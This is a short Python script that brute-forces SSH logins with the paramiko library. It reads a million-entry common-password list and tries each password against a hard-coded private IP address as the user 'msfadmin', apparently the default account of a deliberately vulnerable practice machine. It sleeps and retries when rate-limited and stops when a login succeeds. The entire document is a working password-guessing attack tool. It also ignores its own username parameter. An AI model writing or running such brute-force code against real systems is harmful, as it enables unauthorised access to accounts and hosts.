import socket 
import paramiko
import time

def crack(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username="msfadmin", password=password, timeout=3)
    except socket.timeout:
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        returning = False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        returning = False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        time.sleep(60)
        returning = crack(hostname, username, password)
    else:
        print(f"[+] Found password:{password}")
        returning = True
    finally:
        client.close()
        return returning
with open("./10-million-password-list-top-1000000.txt","r") as file:
    lines = file.read().splitlines()
for line in lines:
    if crack("192.168.1.237","msfadmin",line):
        break